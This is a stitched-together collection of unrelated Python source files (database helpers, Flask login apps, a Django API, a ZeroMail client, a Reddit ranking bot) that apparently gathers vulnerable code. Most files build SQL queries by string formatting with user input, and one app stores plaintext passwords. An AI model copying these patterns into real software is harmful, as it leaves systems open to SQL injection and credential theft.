        query = "SELECT passhash FROM login WHERE login = '%s';" % login                    
        if dry: return query
        result = self.db.query(query)
        if result.ntuples() == 1:
            # Valid username. Check password.
            passhash = result.getresult()[0][0]
            if passhash is None:
                return None
            return _passhash(password) == passhash
        else:
            return False

    # PROBLEM AND PROBLEM ATTEMPT FUNCTIONS #

    def get_problem_problemid(self, exercisename, dry=False):
        """Given an exercise name, returns the associated problemID.
        If the exercise name is NOT in the database, it inserts it and returns
        the new problemID. Hence this may mutate the DB, but is idempotent.
        """
        try:
            d = self.get_single({"identifier": exercisename}, "problem",
                ['problemid'], frozenset(["identifier"]),
                dry=dry)
            if dry:
                return d        # Query string
        except DBException:
            if dry:
                # Shouldn't try again, must have failed for some other reason
                raise
            # if we failed to get a problemid, it was probably because
            # the exercise wasn't in the db. So lets insert it!
            #
            # The insert can fail if someone else simultaneously does
            # the insert, so if the insert fails, we ignore the problem. 
            try:
                self.insert({'identifier': exercisename}, "problem",
                        frozenset(['identifier']))
            except Exception, e:
                pass

            # Assuming the insert succeeded, we should be able to get the
            # problemid now.
            d = self.get_single({"identifier": exercisename}, "problem",
                ['problemid'], frozenset(["identifier"]))

        return d['problemid']

    def insert_problem_attempt(self, login, exercisename, date, complete,
        attempt, dry=False):
        """Inserts the details of a problem attempt into the database.
        exercisename: Name of the exercise. (identifier field of problem
            table). If this exercise does not exist, also creates a new row in
            the problem table for this exercise name.
        login: Name of the user submitting the attempt. (login field of the
            login table).
        date: struct_time, the date this attempt was made.
        complete: bool. Whether the test passed or not.
        attempt: Text of the attempt.

        Note: Even if dry, will still physically call get_problem_problemid,
        which may mutate the DB, and get_user_loginid, which may fail.
        """
        problemid = self.get_problem_problemid(exercisename)
        loginid = self.get_user_loginid(login)  # May raise a DBException

        return self.insert({
                'problemid': problemid,
                'loginid': loginid,
                'date': date,
                'complete': complete,
                'attempt': attempt,
            }, 'problem_attempt',
            frozenset(['problemid','loginid','date','complete','attempt']),
            dry=dry)

    def get_problem_attempt_last_text(self, login, exercisename, dry=False):
        """Given a login name and exercise name, returns the text of the
        last submitted attempt for this question. Returns None if the user has
        not made an attempt on this problem.

        Note: Even if dry, will still physically call get_problem_problemid,
        which may mutate the DB, and get_user_loginid, which may fail.
        """
        problemid = self.get_problem_problemid(exercisename)
        loginid = self.get_user_loginid(login)  # May raise a DBException
        # "Get the single newest attempt made by this user for this problem"
        query = ("SELECT attempt FROM problem_attempt "
            "WHERE loginid = %d AND problemid = %d "
            "ORDER BY date DESC "
            "LIMIT 1;" % (loginid, problemid))
        if dry: return query
        result = self.db.query(query)
        if result.ntuples() == 1:
            # The user has made at least 1 attempt. Return the newest.
            return result.getresult()[0][0]
        else:
            return None

    def close(self):
        """Close the DB connection. Do not call any other functions after
        this. (The behaviour of doing so is undefined).
        """
        self.db.close()
        self.open = False

import sqlite3, cryptlib, os, json, base64, errno, time

current_directory = os.path.dirname(os.path.realpath(__file__))


class ZeroMail(object):
	def __init__(self, zeronet_directory, zeroid, priv):
		self.zeronet_directory = zeronet_directory
		self.zeroid = zeroid
		self.privkey = priv

		self.zeromail_data = zeronet_directory + "data/1MaiL5gfBM1cyb4a8e3iiL8L5gXmoAJu27/data/users/" + zeroid + "/data.json"
		self.cache_directory = current_directory + "/cache/" + base64.b64encode(zeroid)
		try:
			os.makedirs(self.cache_directory)
		except OSError as e:
			if e.errno != errno.EEXIST:
				raise

		self.conn = sqlite3.connect(zeronet_directory + 'data/1MaiL5gfBM1cyb4a8e3iiL8L5gXmoAJu27/data/users/zeromail.db')
		self.cursor = self.conn.cursor()

	def get_secrets(self, from_date_added=0):
		secrets = []
		for row in self.cursor.execute('SELECT encrypted, json_id, date_added FROM secret WHERE date_added > %s ORDER BY date_added DESC' % from_date_added):                    
			aes_key, json_id, date_added = cryptlib.eciesDecrypt(row[0], self.privkey), row[1], row[2]
			if aes_key != None:
				secrets.append([aes_key, json_id])
			from_date_added = max(from_date_added, date_added)
		return (secrets, from_date_added)
	def update_secrets(self):
		old_secrets = []
		from_date_added = 0
		try:
			with open(self.cache_directory + "/secrets.json", "r") as f:
				cache = json.loads(f.read())
				old_secrets = cache["secrets"]
				from_date_added = cache["date_added"]
		except:
			pass

		new_secrets, date_added = self.get_secrets(from_date_added)
		secrets = old_secrets + new_secrets

		with open(self.cache_directory + "/secrets.json", "w") as f:
			cache = dict(secrets=secrets, date_added=date_added)
			f.write(json.dumps(cache))

		return secrets

	def get_messages(self, secrets, from_date_added=0):
		date_added = from_date_added

		res = dict()
		for s in secrets:
			aes_key, json_id = s[0], s[1]
			messages = self.cursor.execute("""
				SELECT
					encrypted,
					date_added,
					keyvalue.value AS cert_user_id
				FROM message

				LEFT JOIN json
				ON (message.json_id = json.json_id)

				LEFT JOIN json AS json_content
				ON (json.directory = json_content.directory AND json_content.file_name = "content.json")

				LEFT JOIN keyvalue
				ON (keyvalue.json_id = json_content.json_id)

				WHERE
					message.json_id = ? AND
					date_added > ?
				ORDER BY date_added DESC
			""", (json_id, from_date_added))
			for m in messages:
				message = m[0].split(',')
				iv, encrypted_text = message[0], message[1]
				result = cryptlib.aesDecrypt(iv, encrypted_text, aes_key)
				if result != None:
					res[str(m[1])] = dict(raw=result, cert_user_id=m[2])
				date_added = max(date_added, m[1])

		return (res, date_added)
	def update_messages(self, secrets):
		old_messages = dict()
		from_date_added = 0
		try:
			with open(self.cache_directory + "/messages.json", "r") as f:
				cache = json.loads(f.read())
				old_messages = cache["messages"]
				from_date_added = cache["date_added"]
		except:
			pass

		new_messages, date_added = self.get_messages(secrets, from_date_added)

		messages = old_messages.copy()
		messages.update(new_messages)

		with open(self.cache_directory + "/messages.json", "w") as f:
			cache = dict(messages=messages, date_added=date_added)
			f.write(json.dumps(cache))

		return messages

	def remove_message(self, secrets, message):
		messages = self.update_messages(secrets)
		messages.pop(str(message))

		date_added = None
		with open(self.cache_directory + "/messages.json", "r") as f:
			date_added = json.loads(f.read())["date_added"]

		with open(self.cache_directory + "/messages.json", "w") as f:
			cache = dict(messages=messages, date_added=date_added)
			f.write(json.dumps(cache))

	def load_secrets_sent(self):
		data = None
		with open(self.zeromail_data, "r") as f:
			data = json.loads(f.read())

		secrets_sent = data["secrets_sent"]
		secrets_sent = cryptlib.eciesDecrypt(secrets_sent, self.privkey)
		secrets_sent = json.loads(secrets_sent)
		return secrets_sent
	def get_secret(self, address):
		secrets_sent = self.load_secrets_sent()
		if address in secrets_sent:
			return secrets_sent[address].split(":", 1)[1]
		return self.add_secret(address)

	def send(self, address, subject, body, to):
		secret = self.get_secret(address)
		message = json.dumps(dict(subject=subject, body=body, to=to))
		aes, iv, encrypted = cryptlib.aesEncrypt(message, secret)

		data = None
		with open(self.zeromail_data, "r") as f:
			data = json.loads(f.read())
		print data

		date = int(time.time() * 1000)
		data["message"][str(date)] = iv + "," + encrypted
		data["date_added"] = int(time.time() * 1000)

		with open(self.zeromail_data, "w") as f:
			f.write(json.dumps(data))                    


#!/usr/bin/env python

"""
Connects to the event database produced by netevmon and queries it for
events.
"""

import datetime
import time
import urllib2
import sys
import ampy.result

from sqlalchemy.sql import and_, or_, not_, text                    
from sqlalchemy.sql.expression import select, outerjoin, func, label                    
from sqlalchemy.engine.url import URL                    
from sqlalchemy import create_engine, MetaData, Table                    
from sqlalchemy.engine import reflection                    

try:
    import pylibmc
    _have_memcache = True
except ImportError:
    _have_memcache = False

class Connection(object):

    def __reflect_db(self):
        self.metadata = MetaData(self.engine)
        try:
            self.metadata.reflect(bind=self.engine)
        except OperationalError, e:
            print >> sys.stderr, "Error binding to database %s" % (dbname)
            print >> sys.stderr, "Are you sure you've specified the right database name?"
            sys.exit(1)

        # reflect() is supposed to take a 'views' argument which will
        # force it to reflects views as well as tables, but our version of
        # sqlalchemy didn't like that. So fuck it, I'll just reflect the
        # views manually
        views = self.inspector.get_view_names()
        for v in views:
            view_table = Table(v, self.metadata, autoload=True)


    def __init__(self, host=None, name="events", pwd=None, user=None):
        cstring = URL('postgresql', password=pwd, \                    
                host=host, database=name, username=user)                    

        self.engine = create_engine(cstring, echo=False)                    
        self.inspector = reflection.Inspector.from_engine(self.engine)                    
        self.__reflect_db()                    

        self.conn = self.engine.connect()                    

    def __del__(self):
        self.conn.close()                    

    def get_stream_events(self, stream_ids, start=None, end=None):
        """Fetches all events for a given stream between a start and end
           time. Events are returned as a Result object."""
        # Honestly, start and end should really be set by the caller
        if end is None:
            end = int(time.time())

        if start is None:
            start = end - (12 * 60 * 60)

        evtable = self.metadata.tables['event_view']                    

        # iterate over all stream_ids and fetch all events
        stream_str = "("                    
        index = 0                    
        for stream_id in stream_ids:                    
            stream_str += "%s = %s" % (evtable.c.stream_id, stream_id)                    
            index += 1                    
            # Don't put OR after the last stream!
            if index != len(stream_ids):                    
                stream_str += " OR "                    
        stream_str += ")"                    

        wherecl = "(%s >= %u AND %s <= %u AND %s)" % ( \                    
                evtable.c.timestamp, start, evtable.c.timestamp, \                    
                end, stream_str)                    

        query = evtable.select().where(wherecl).order_by(evtable.c.timestamp)                    
        return self.__execute_query(query)                    

    def __execute_query(self, query):                    

        res = query.execute()                    

        event_list = []                    

        for row in res:                    
            foo = {}                    
            for k,v in row.items():                    
                foo[k] = v                    
            event_list.append(foo)                    
        res.close()                    

        return ampy.result.Result(event_list)                    

    def get_events_in_group(self, group_id):
        """Fetches all of the events belonging to a specific event group.
           The events are returned as a Result object."""
        evtable = self.metadata.tables['full_event_group_view']                    

        wherecl = "(%s = %u)" % (evtable.c.group_id, group_id)                    

        query = evtable.select().where(wherecl).order_by(evtable.c.timestamp)                    
        return self.__execute_query(query)                    

    def get_event_groups(self, start=None, end=None):
        """Fetches all of the event groups between a start and end time.
           The groups are returned as a Result object."""
        if end is None:
            end = int(time.time())

        if start is None:
            start = 0

        start_dt = datetime.datetime.fromtimestamp(start)
        end_dt = datetime.datetime.fromtimestamp(end)

        grptable = self.metadata.tables['event_group']                    

        wherecl = and_(grptable.c.group_start_time >= start_dt, \                    
                grptable.c.group_end_time <= end_dt)                    

        query = grptable.select().where(wherecl).order_by(grptable.c.group_start_time)                    
        return self.__execute_query(query)                    


# vim: set smartindent shiftwidth=4 tabstop=4 softtabstop=4 expandtab :

try:
    from setuptools.core import setup
except ImportError:
    from distutils.core import setup

requires = [
    'sqlalchemy'                    
    ]

setup(
    name='ampy',
    description='Python library for interacting with AMP data.',
    packages=['ampy'],
    install_requires=requires,
    version='0.0',
    author='',
    author_email='',
    url='',
    long_description=open('README.txt').read(),
)

import psycopg2
import consts
from metrics.Network.partition import partition_bots, partition_groups
from sentiment_analysis import sentiment_compound_score

connection = psycopg2.connect(**consts.db_creds)


def get_edges(users):
    user_dict = {}
    for i in users:
        user_dict[i] = 1
    cursor = connection.cursor()
    drop_old = "DELETE FROM temp"
    connection.commit()
    try:
        cursor.execute(drop_old)
    except psycopg2.ProgrammingError:
        pass
    insert = """INSERT INTO temp (usr)
                 VALUES (%s);"""
    for user in user_dict:
        cursor.execute(insert, [user])
    connection.commit()
    select = """ SELECT influences.usr, influences.other_usr
                 FROM influences
                 INNER JOIN temp as t1
                 ON t1.usr = influences.usr AND influences.usr != influences.other_usr
                 INNER JOIN temp as t2
                 ON t2.usr = influences.other_usr"""
    cursor.execute(select)
    edges = []
    fetched = [None]
    while len(fetched) > 0:
        fetched = cursor.fetchall()
        edges.extend(fetched)
    cursor.execute(drop_old)
    connection.commit()
    return edges


def get_tweets(keywords):
    select_tweets = """SELECT interactions.usr, interactions.other_usr, tweets.text
                       FROM interactions
                       INNER JOIN tweets
                       ON tweets.twid = interactions.twid
                       WHERE tweets.text LIKE '%{}%' """ + "AND tweets.text LIKE '%{}%' " * (len(keywords) - 1)                    
    select_tweets = select_tweets.format(*keywords)                    
    cursor = connection.cursor()
    cursor.execute(select_tweets)                    
    fetched = [None]
    output = []
    while len(fetched) > 0:
        fetched = cursor.fetchall()
        output.extend(fetched)
    return output


def get_sentiment(groups, tweets):
    groups_dict = {}
    for i, group in enumerate(groups):
        for user in group:
            groups_dict[user] = i
    total_sentiment = [[0 for _ in range(len(groups))] for _ in range(len(groups))]
    for tweet in tweets:
        if tweet[0] in groups_dict and tweet[1] in groups_dict:
            total_sentiment[groups_dict[tweet[0]]][groups_dict[tweet[1]]] += sentiment_compound_score(tweet[2])
    return total_sentiment


def sub_network(keywords):
    tweets = get_tweets(keywords)
    users = set()
    for i, j, _ in tweets:
        users.add(i)
        users.add(j)
    users = list(users)
    group1, group2 = partition_groups(users)
    partition = {}
    for i in group1:
        partition[i] = 0
    for i in group2:
        partition[i] = 1
    group1h, group1b = partition_bots(group1)
    group2h, group2b = partition_bots(group2)
    for i in tweets:
        if i[0] in group1h and i[1] in group2h:
            print(i[2])
            break
    sentiment = get_sentiment((group1h, group1b, group2h, group2b), tweets)
    return group1h, group1b, group2h, group2b, sentiment

from flask import Flask, render_template, url_for, flash, redirect, request
from flask_sqlalchemy import SQLAlchemy 

app = Flask(__name__, static_folder='static', static_url_path='')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.sqlite3'
app.config['SECRET_KEY'] = "random string"
db = SQLAlchemy(app)

class User(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	email = db.Column(db.String(50))                    
	password = db.Column(db.String(20))

	def __init__(self, email, password):                    
		self.email = email                    
		self.password = password

@app.route('/')
def home():
	return render_template('home.html')

@app.route('/tables')
def tables():
	return render_template('tables.html', User=User.query.all())                    

@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		user = User(request.form['email'], request.form['password'])                    
		db.session.add(user)                    
		db.session.commit()                    
		return redirect(url_for('tables'))                    
	return render_template('login.html')

# Drop/Create all Tables
db.drop_all()
db.create_all()

if __name__ == '__main__':
	app.run(debug = True)
	


__author__      = "Kyle Chesney"

from flask import *
from flask_login import LoginManager
# TODO: Research SQLAlchemy vs raw SQL
#from flask_sqlalchemy import SQLAlchemy
# TODO: MariaDB vs PostgreSQL, re: audit trail
import sqlite3
from datetime import datetime as dt

app = Flask(__name__)
login = LoginManager(app)
#db = SQLAlchemy()

@app.route('/')
def home():
#    if current_user.is_authenticated:
    return render_template('login.html')
#    if not session.get('logged_in'):
#        return render_template('login.html')


# TODO: separate POST requests to allow entry of params after logging in
@app.route('/', methods=['POST'])
def login():
    print('login')
    user = str(request.form['username'])
    password = str(request.form['password'])
    cur.execute('SELECT * FROM users WHERE name = \'{}\' AND password = \'{}\';'.format(user, password))                    
    response = cur.fetchone()
    if response != None:
        print(response, 'OK')
        return redirect(url_for('enter_test_point'))
    else:
        print(response, 'not OK')
        flash('Invalid login or password')
        return render_template('login.html')

@app.route('/entry_type')
def enter_log():
    # conn = sqlite3.connect
    methods = ['Metals', 'Organics']
    return render_template('entry.html', methods = methods)

#@app.route('/entry', methods=['POST', 'GET'])
#def render_entry():
#    print('only here')
#    return render_template('make_entry.html')

@app.route('/entry', methods=['POST', 'GET'])
def enter_test_point():
    if request.method == 'POST':
        dict = {}
        dict['study'] = 'test'
        dict['timestamp'] = dt.now()
        print(request.form)
        for item, val in request.form.items():
            dict[item] =  val
        print(dict)
        sql = """INSERT INTO observations (study, pH, TDS, Turbidity, Temperature, timestamp)
        VALUES(?,?,?,?,?,?)"""
        cur.execute(sql, tuple(dict[k] for k in dict.keys()))
        db.commit()
    return render_template('make_entry.html', parameters = ['pH', 'TDS', 'Turbidity', 'Temperature'])


if __name__ == "__main__":
    app.secret_key = 'bottom text'
    db = sqlite3.connect('db/test.db', check_same_thread=False)
    cur = db.cursor()
    app.run(debug=True, host = '0.0.0.0')

import pymysql
import dbconfig


class DBHelper:
    def connect(self, database='crimemap'):
        return pymysql.connect(host='localhost', user=dbconfig.db_user, password=dbconfig.db_password, db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            query = "INSERT INTO crimes (description) VALUES('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"

            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()


from django.db.models import Prefetch, Q                    
from django.shortcuts import get_object_or_404

from rest_framework import generics

from db.map.models import State, Municipality, Locality, Action, Organization, Establishment, Submission
from api.serializers import StateSerializer, MunicipalitySerializer
from api.serializers import LocalityDetailSerializer, LocalityRawSerializer, LocalitySearchSerializer
from api.serializers import EstablishmentSerializer, SubmissionSerializer
from api.serializers import ActionSubmissionsSerializer, ActionLogSerializer, ActionDetailSerializer
from api.serializers import OrganizationSerializer, OrganizationDetailSerializer
from api.paginators import LargeNoCountPagination
from api.throttles import SearchBurstRateScopedThrottle
from api.filters import ActionFilter, EstablishmentFilter, SubmissionFilter


class StateList(generics.ListAPIView):
    serializer_class = StateSerializer

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            State.objects.all()
        )


class MunicipalityList(generics.ListAPIView):
    serializer_class = MunicipalitySerializer

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Municipality.objects.all()
        )


locality_list_raw_query = """
SELECT
    map_locality.*,
    (SELECT
        COUNT(*)
        FROM map_action
        WHERE map_action.locality_id = map_locality.id AND map_action.published = true
    ) AS action_count
FROM map_locality
WHERE map_locality.has_data = true"""


class LocalityList(generics.ListAPIView):
    serializer_class = LocalityRawSerializer
    pagination_class = LargeNoCountPagination

    def get_queryset(self):
        return Locality.objects.raw(locality_list_raw_query)


class LocalityDetail(generics.RetrieveAPIView):
    serializer_class = LocalityDetailSerializer

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Locality.objects.all().order_by('-modified')
        )


class EstablishmentList(generics.ListAPIView):
    serializer_class = EstablishmentSerializer
    filter_class = EstablishmentFilter

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Establishment.objects.all()
        )


class ActionList(generics.ListAPIView):
    serializer_class = ActionSubmissionsSerializer
    filter_class = ActionFilter

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Action.objects.filter(published=True)
        )


class ActionDetail(generics.RetrieveAPIView):
    serializer_class = ActionDetailSerializer

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Action.objects.filter(published=True)
        )


class ActionLogList(generics.ListAPIView):
    serializer_class = ActionLogSerializer

    def get_queryset(self):
        action = get_object_or_404(Action, pk=self.kwargs['pk'], published=True)
        return self.get_serializer_class().setup_eager_loading(
            action.actionlog_set.all().order_by('-modified')
        )


class OrganizationList(generics.ListAPIView):
    serializer_class = OrganizationSerializer

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Organization.objects.all().order_by('-modified')
        )


class OrganizationDetail(generics.RetrieveAPIView):
    serializer_class = OrganizationDetailSerializer

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Organization.objects.all().order_by('-modified')
        )


class SubmissionList(generics.ListAPIView):
    serializer_class = SubmissionSerializer
    filter_class = SubmissionFilter

    def get_queryset(self):
        return self.get_serializer_class().setup_eager_loading(
            Submission.objects.filter(Q(action__isnull=True) | Q(action__published=True), published=True)
        )


locality_list_search_query = """
SELECT id, cvegeo, location, name, municipality_name, state_name
FROM locality_search_index
WHERE document @@ to_tsquery('spanish', '{tokens}')                    
ORDER BY ts_rank(document, to_tsquery('spanish', '{tokens}')) DESC
LIMIT 30"""


class LocalitySearch(generics.ListAPIView):
    search_burst_throttle_scope = 'search_burst'
    throttle_classes = (SearchBurstRateScopedThrottle,)

    serializer_class = LocalitySearchSerializer

    def get_queryset(self):
        search = self.request.query_params.get('search', '')
        tokens = ' & '.join(search.split())
        return Locality.objects.raw(locality_list_search_query.format(tokens=tokens))                    

import praw
import re
from datetime import datetime
import operator

import sqlite3

def getDate(submission):
    time = datetime.fromtimestamp(submission.created)
    # return datetime.date.fromtimestamp(time)
    return time.strftime('%Y-%m-%d %H:%M:%S')

def getTitle(submission):
    delimChars = ['-', ':', '=', '#', '(', ')']

    title = str(submission.title)

    # Get first part of title by spliting before line or colon
    for delimChar in delimChars:
        title = title.split(delimChar)[0]

    # Join the resulting chars
    return str(''.join(re.findall('[a-zA-Z]', title)).lower())

def addToDatabase(submissionList):

    # Measure time
    startTime = datetime.now()

    database = sqlite3.connect('database.db')
    cursor = database.cursor()

    #reddit = getRedditInstance()

    botUsername = getBotUsername()

    # Get top level comments from submissions and get their first numbers with regex
    for submission in reversed(list(submissionList)):
        scoresInChallenge = [[-1, ''], [-2, ''], [-3, ''], [-4, '']] 
        for topLevelComment in submission.comments:

            # Looks for !TrackThisSeries and !StopTracking posts and replies to them
            try:
                if topLevelComment.author.name == submission.author.name:
                    alreadyReplied = False
                    if '!trackthisseries' in topLevelComment.body.lower():
                        print("Found track request: " + str(submission.id))
                        # Write new entries to the local database
                        cursor.execute("INSERT OR REPLACE INTO SeriesTracking VALUES ('" + getTitle(submission) + "', '" + getDate(submission) + "')")                    
                        
                        for reply in topLevelComment.replies:
                            if reply.author.name == botUsername:
                                alreadyReplied = True
                                #cursor.execute("INSERT OR REPLACE INTO TrackingRequests VALUES ('" + str(topLevelComment.fullname) + "')")

                        #if cursor.execute("SELECT COUNT(*) FROM TrackingRequests WHERE CommentID = '" + str(topLevelComment.fullname) + "'").fetchone()[0] == 0:
                        if not alreadyReplied:
                            replyToTrackRequest(topLevelComment, True)
                    if '!stoptracking' in topLevelComment.body.lower():
                        print("Found stop tracking request: " + str(submission.id))
                        # Delete old entries in the database
                        cursor.execute("DELETE FROM SeriesTracking WHERE SeriesTitle = '" + getTitle(submission) + "'")                    
                        
                        for reply in topLevelComment.replies:
                            if reply.author.name == botUsername:
                                alreadyReplied = True
                                #cursor.execute("INSERT OR REPLACE INTO TrackingRequests VALUES ('" + str(topLevelComment.fullname) + "')")

                        #if cursor.execute("SELECT COUNT(*) FROM TrackingRequests WHERE CommentID = '" + str(topLevelComment.fullname) + "'").fetchone()[0] == 0:
                        if not alreadyReplied:
                            replyToTrackRequest(topLevelComment, False)
            except AttributeError:
                pass

            # Avoid comments which do not post their own score; Get the highest number in each comment and add it to the list with the user's username
            if 'Previous win:' not in topLevelComment.body and 'for winning' not in topLevelComment.body and 'for tying' not in topLevelComment.body and '|' not in topLevelComment.body and topLevelComment is not None and topLevelComment.author is not None:
                try:
                    number = max([int(number.replace(',', '')) for number in re.findall('(?<!round )(?<!~~)(?<!\w)\d+\,?\d+', topLevelComment.body)])
                except (IndexError, ValueError) as e:
                    number = -1
                    break
                if 0 <= number <= 32395:
                    scoresInChallenge.append([int(number), topLevelComment.author.name])
        scoresInChallenge.sort(key = operator.itemgetter(0), reverse = True)

        # If two players have the same score add the second one to the authors of the first challenge with a pipe character inbetween
        for i in range(0, 3):
            while scoresInChallenge[i][0] == scoresInChallenge[i + 1][0]:
                scoresInChallenge[i][1] += "|" + scoresInChallenge[i + 1][1]
                del scoresInChallenge[i + 1]
        #print(index)
        #print(getTitle(submission.title))
        #print(submission.id)
        #print(scoresInChallenge[0][1])
        #print(scoresInChallenge[1][1])
        #print(scoresInChallenge[2][1])
        #print(submission.created)

        # Write new entries to the local database
        record = (str(submission.id), getTitle(submission), str(scoresInChallenge[0][1]), str(scoresInChallenge[1][1]), str(scoresInChallenge[2][1]), getDate(submission))                    
        cursor.execute("INSERT OR REPLACE INTO ChallengeRankings VALUES (?, ?, ?, ?, ?, ?)", record)                    

        #if cursor.execute("SELECT COUNT(*) FROM ChallengeRankings WHERE SubmissionID = '" + submission.id + "'").fetchone()[0] == 0:
        #    cursor.execute("INSERT INTO ChallengeRankings VALUES (?, ?, ?, ?, ?, ?)", record)
        # Update existing entries in the local database
        #else:
        #    cursor.execute("UPDATE ChallengeRankings SET Place1 = '" + str(scoresInChallenge[0][1]) + "', Place2 = '" + str(scoresInChallenge[1][1]) + "', Place3 = '" + str(scoresInChallenge[2][1]) + "' WHERE SubmissionID = '" + str(submission.id) + "'")

    database.commit()
    database.close()

# Reply to the comment which asks the bot to track the series
def replyToTrackRequest(comment, positive):
    if positive == True:
        print("I will be tracking this series: " + getTitle(comment.submission.title) + " because of this comment " + comment.fullname)
        #comment.reply("I will be tracking this series from now on.")
    else:
        print("I will stop tracking this series: " + getTitle(comment.submission.title) + " because of this comment " + comment.fullname)
        #comment.reply("I will stop tracking this series from now on.")

def getBotUsername():
    inputFile = open("RedditAPIAccess.txt")
    lines = []
    for line in inputFile:
        lines.append(line)
    return line[2]

import praw
import re
from datetime import datetime
from CreateAndUploadPlots import createAndUploadPlots
from CreateTableFromDatabase import getRankingsFromDatabase
from AddScoresToDatabase import getTitle
from AddScoresToDatabase import getDate
from AddScoresToDatabase import addToDatabase
from AddScoresToDatabase import getBotUsername
from InitDatabase import getRedditInstance
#import datetime
import operator

import sqlite3



# Checks about 100 new submissions, adds them to the local database, renews track requests
def checkNewSubmissions():

    # Measure time
    startTime = datetime.now()

    #cursor.execute("INSERT OR REPLACE INTO SeriesTracking VALUES (SeriesTitle = 'redditgeoguessrcommunitychallenge', StartDate = '2017-07-10 01:00:00')")
    #database = sqlite3.connect('database.db')
    #cursor = database.cursor()
    #for val in cursor.execute("SELECT * FROM SeriesTracking"):
    #    print(val)
    #database.close()

    #cursor.commit()

    reddit = getRedditInstance()
    subreddit = reddit.subreddit("geoguessr")

    submissionList = subreddit.new(limit = 10)

    addToDatabase(submissionList)

    checkForSeriesSubmissions(submissionList)
            
    # Print how long it took
    print(datetime.now() - startTime)

# Check the submissionList for submissions for posts whose series is on the tracking list
def checkForSeriesSubmissions(submissionList):
    database = sqlite3.connect('database.db')
    cursor = database.cursor()

    botUsername = getBotUsername()

    for submission in submissionList:
        if cursor.execute("SELECT COUNT(*) FROM SeriesTracking WHERE SeriesTitle = '" + str(getTitle(submission)) + "'").fetchone()[0] != 0:                    
            alreadyPosted = False
            for reply in submission.comments:
                try:
                    if reply.author.name == botUsername:
                        alreadyPosted = True
                except AttributeError:
                    pass
            if not alreadyPosted and getSeriesDateFromDatabase(submission) <= getSubmissionDateFromDatabase(submission):
                print("Replying to submission: " + str(submission.id) + " in series: " + str(getTitle(submission)))                    
                replyTrackedStats(submission)

    database.close()

# Reply to a post which has tracking enabled with the statistics of the series up until that post excluding itself
def replyTrackedStats(submission):

    table = getRankingsFromDatabase(submission)
    text = ""
    place = 0
    for index, row in enumerate(table):
        #print(row)
        if index != 0:
            if table[index][1] != table[index - 1][1] or table[index][2] != table[index - 1][2] or table[index][3] != table[index - 1][3]:
                place = index

        text += str(place + 1) + getPostFix(place + 1)
        for i, val in enumerate(row):
            if i == 0:
                text += '|/u/' + str(val)
            else:
                text += '|' + str(val)
        text += '\n'

    url = createAndUploadPlots(table, submission.id)

    gameCount = getGameCountInSeriesSoFar(submission)

    #submission.reply
    print("I have found " + str(gameCount) + " challenges in this series so far:\n\nRanking|User|1st|2nd|3rd\n:--|:--|:--|:--|:--\n" + 
        text + "\n\n[Here](" + 
        url + ") is a visualization of the current stats.\n\n---\n\n^(I'm a bot, message the author: /u/LiquidProgrammer if I made a mistake.) ^[Usage](https://www.reddit.com/r/geoguessr/comments/6haay2/).")

# Get the postfix st, nd, rd or th for a number
def getPostFix(index):
    if index % 10 == 1 and index % 100 != 11:
        return 'st'
    if index % 10 == 2 and index % 100 != 12:
        return 'nd'
    if index % 10 == 3 and index % 100 != 13:
        return 'rd'
    else:
        return 'th'

# Count the number of games in a series up until that post
def getGameCountInSeriesSoFar(submission):
    database = sqlite3.connect('database.db')
    cursor = database.cursor()
    return cursor.execute("SELECT COUNT(*) FROM ChallengeRankings WHERE SeriesTitle = '" + getTitle(submission) + "' AND Date <= '" + getSubmissionDateFromDatabase(submission) + "'").fetchone()[0]                    
    database.close()

def getSeriesDateFromDatabase(submission):
    database = sqlite3.connect('database.db')
    cursor = database.cursor()
    return cursor.execute("SELECT StartDate FROM SeriesTracking WHERE SeriesTitle = '" + str(getTitle(submission)) + "'").fetchone()[0]                    
    database.close()

def getSubmissionDateFromDatabase(submission):
    database = sqlite3.connect('database.db')
    cursor = database.cursor()
    return cursor.execute("SELECT Date FROM ChallengeRankings WHERE SubmissionID = '" + str(submission.id) + "'").fetchone()[0]                    
    database.close()

if __name__ == '__main__':
    checkNewSubmissions()

import sqlite3
import operator
from AddScoresToDatabase import getTitle
from AddScoresToDatabase import getDate
from InitDatabase import getRedditInstance

# Create a table with the rankings from the local database for a series up until a specific submission excluding that submission
def getRankingsFromDatabase(submission):
    
    # Connect to database
    database = sqlite3.connect("database.db")
    cursor = database.cursor()

    # Create a set with all the usernames in that series
    nameSet = set()
    for row in cursor.execute("SELECT Place1, Place2, Place3 FROM ChallengeRankings WHERE SeriesTitle = '" + getTitle(submission) + "' AND Date < '" + str(getDate(submission)) + "'"):                    
        for val in row:
            if val is not '':
                for author in val.split('|'):
                    nameSet.add(author)
                
    nameList = [name for name in nameSet]

    table = [[name, 0, 0, 0] for name in nameList]

    # Iterate through every post in the series and increment the winners in the table
    for i in range(1, 4):
        for row in cursor.execute("SELECT Place" + str(i) + " FROM ChallengeRankings WHERE SeriesTitle = '" + getTitle(submission) + "' AND Date < '" + str(getDate(submission)) + "'"):                    
            for val in row:
                if val is not '':
                    for author in val.split('|'):
                        table[nameList.index(author)][i] += 1

    table.sort(reverse = True, key = operator.itemgetter(1, 2, 3))

    database.close()

    #print(table)
    return table

if __name__ == '__main__':
    reddit = getRedditInstance()
    print(getRankingsFromDatabase(reddit.submission(id = '6haay2')))




from flask import Flask
from flask import request
import ast
import sqlite3
import bcrypt

app = Flask(__name__)
